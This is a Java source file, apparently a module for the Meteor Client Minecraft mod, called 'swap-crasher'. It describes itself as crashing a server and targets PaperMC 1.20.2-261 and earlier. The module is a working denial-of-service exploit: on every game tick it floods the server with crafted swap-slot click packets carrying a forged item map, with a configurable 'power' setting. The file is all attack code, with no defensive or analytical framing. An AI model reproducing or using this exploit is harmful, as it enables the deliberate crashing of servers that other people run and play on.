package io.github.racoondog.crasher;

import it.unimi.dsi.fastutil.ints.Int2ObjectArrayMap;
import it.unimi.dsi.fastutil.ints.Int2ObjectMap;
import meteordevelopment.meteorclient.events.game.GameLeftEvent;
import meteordevelopment.meteorclient.events.world.TickEvent;
import meteordevelopment.meteorclient.settings.BoolSetting;
import meteordevelopment.meteorclient.settings.IntSetting;
import meteordevelopment.meteorclient.settings.Setting;
import meteordevelopment.meteorclient.settings.SettingGroup;
import meteordevelopment.meteorclient.systems.modules.Categories;
import meteordevelopment.meteorclient.systems.modules.Module;
import meteordevelopment.orbit.EventHandler;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;
import net.minecraft.item.ItemStack;
import net.minecraft.item.Items;
import net.minecraft.network.packet.c2s.play.ClickSlotC2SPacket;
import net.minecraft.screen.ScreenHandler;
import net.minecraft.screen.slot.SlotActionType;

@Environment(EnvType.CLIENT)
public class CrasherModule extends Module {
    private final SettingGroup sgGeneral = this.settings.getDefaultGroup();

    private final Setting<Integer> power = sgGeneral.add(new IntSetting.Builder()
        .name("power")
        .range(1, 12)
        .defaultValue(6)
        .build()
    );

    private final Setting<Boolean> toggleOnLeave = sgGeneral.add(new BoolSetting.Builder()
        .name("toggle-on-leave")
        .defaultValue(true)
        .build()
    );

    public CrasherModule() {
        super(Categories.Misc, "swap-crasher", "Crashes a server by spamming swap slot packets. Works with PaperMC 1.20.2-261 and under.");
    }

    @EventHandler
    private void onTick(TickEvent.Pre event) {
        ScreenHandler handler = mc.player.currentScreenHandler;
        Int2ObjectMap<ItemStack> map = new Int2ObjectArrayMap<>();
        map.put(0, new ItemStack(Items.ACACIA_BOAT, 1));
        ItemStack cursorStack = handler.getCursorStack().copy();

        for (int i = 0; i < power.get(); i++) {
            mc.getNetworkHandler().sendPacket(new ClickSlotC2SPacket(
                handler.syncId,
                handler.getRevision(),
                36,
                -1,
                SlotActionType.SWAP,
                cursorStack,
                map
            ));
        }
    }

    @EventHandler
    private void onLeave(GameLeftEvent event) {
        if (toggleOnLeave.get()) toggle();
    }
}
